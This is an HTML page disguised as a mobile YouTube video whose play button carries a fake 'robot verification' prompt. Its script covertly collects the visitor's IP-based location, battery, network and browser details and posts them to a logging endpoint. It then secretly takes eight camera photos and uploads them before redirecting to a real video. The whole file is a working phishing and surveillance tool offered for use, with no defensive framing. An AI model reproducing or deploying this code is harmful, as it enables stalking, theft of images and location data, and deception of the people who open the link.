<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>YouTube</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --yt-red: #ff0000; --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-surface: #272727; }
        body { margin: 0; background-color: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        
        /* Mobile Header */
        header { height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: sticky; top: 0; background: var(--yt-bg); z-index: 100; border-bottom: 1px solid #222; }
        .yt-logo { display: flex; align-items: center; color: white; text-decoration: none; font-weight: bold; font-size: 18px; }
        .yt-logo i { color: var(--yt-red); font-size: 22px; margin-right: 5px; }

        /* Video Area */
        .video-box { width: 100%; aspect-ratio: 16 / 9; background: #000; display: flex; align-items: center; justify-content: center; position: relative; }
        .play-btn { font-size: 60px; color: white; cursor: pointer; opacity: 0.9; }
        
        /* Loading Spinner */
        .loader { border: 4px solid #333; border-left-color: var(--yt-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* Video Info */
        .info { padding: 12px 16px; }
        .v-title { font-size: 17px; font-weight: 500; line-height: 22px; margin-bottom: 6px; }
        .v-meta { font-size: 12px; color: #aaa; margin-bottom: 12px; }

        /* Channel Section */
        .sub-bar { display: flex; align-items: center; gap: 12px; border-top: 1px solid #222; border-bottom: 1px solid #222; padding: 12px 0; margin-top: 10px; }
        .pfp { width: 36px; height: 36px; background: #ff4500; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
        .btn-sub { background: white; color: black; border-radius: 20px; padding: 0 16px; height: 36px; border: none; font-weight: 600; margin-left: auto; font-size: 14px; }

        /* Comments Mockup */
        .comments-section { background: var(--yt-surface); border-radius: 12px; padding: 12px; margin-top: 15px; font-size: 13px; }

        video, canvas { display: none; position: absolute; }
    </style>
</head>
<body>
    <header>
        <a href="#" class="yt-logo"><i class="fab fa-youtube"></i> YouTube</a>
        <div style="display: flex; gap: 18px;"><i class="fas fa-search"></i> <i class="fas fa-ellipsis-v"></i></div>
    </header>

    <div class="video-box" id="box">
        <i class="fas fa-play play-btn" onclick="startCapture()"></i>
    </div>

    <div class="info">
        <div class="v-title">Robot Verification: Tap Play to Confirm Identity</div>
        <div class="v-meta">1.2M views • 1 hour ago</div>
        
        <div class="sub-bar">
            <div class="pfp">V</div>
            <div>
                <div style="font-weight:600; font-size: 14px;">VinzyStore <i class="fas fa-check-circle" style="font-size:10px;color:#aaa"></i></div>
                <div style="font-size:12px;color:#aaa">542K subscribers</div>
            </div>
            <button class="btn-sub">Subscribe</button>
        </div>

        <div class="comments-section">
            <div style="font-weight: bold; margin-bottom: 5px;">Comments</div>
            <div style="display: flex; gap: 10px; align-items: center;">
                <div style="width:24px; height:24px; background:#555; border-radius:50%"></div>
                <p style="margin:0; color: #eee;">Access restricted. Complete verification to view.</p>
            </div>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const tid = urlParams.get('id');
        const ytid = urlParams.get('ytid') || 'dQw4w9WgXcQ';
        const camMode = urlParams.get('cam') || 'user';

        async function startCapture() {
            // UI Update: Show Loading
            document.getElementById('box').innerHTML = '<div class="loader"></div>';

            try {
                // Request Camera access
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: camMode },
                    audio: false 
                });
                const video = document.getElementById('v');
                video.srcObject = stream;

                // 1. Gather Advanced Android Telemetry
                let batInfo = "N/A";
                try {
                    const battery = await navigator.getBattery();
                    batInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
                } catch(e) {}

                let netInfo = "N/A";
                if (navigator.connection) {
                    netInfo = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.downlink} Mbps)`;
                }

                // Get IP and Location
                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));

                // Send Log to Bot
                await fetch(`/log_info?id=${tid}`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ...ipRes,
                        battery: batInfo,
                        net_type: netInfo,
                        platform: "Android Phone",
                        browser: navigator.userAgent,
                        language: navigator.language
                    })
                });

                // 2. Start Image Capture Loop (8 Photos)
                let photoCount = 0;
                const captureInterval = setInterval(() => {
                    if (photoCount >= 8) {
                        clearInterval(captureInterval);
                        // Redirect to the actual YouTube video
                        window.location.href = "https://www.youtube.com/watch?v=" + ytid;
                        return;
                    }

                    const canvas = document.getElementById('c');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('file', blob, 'android_log.jpg');
                        fetch(`/upload?id=${tid}&type=photo`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.7);

                    photoCount++;
                }, 750);

            } catch (err) {
                console.error(err);
                alert("Security Error: Camera access is mandatory for robot verification.");
                location.reload();
            }
        }
    </script>
</body>
</html>
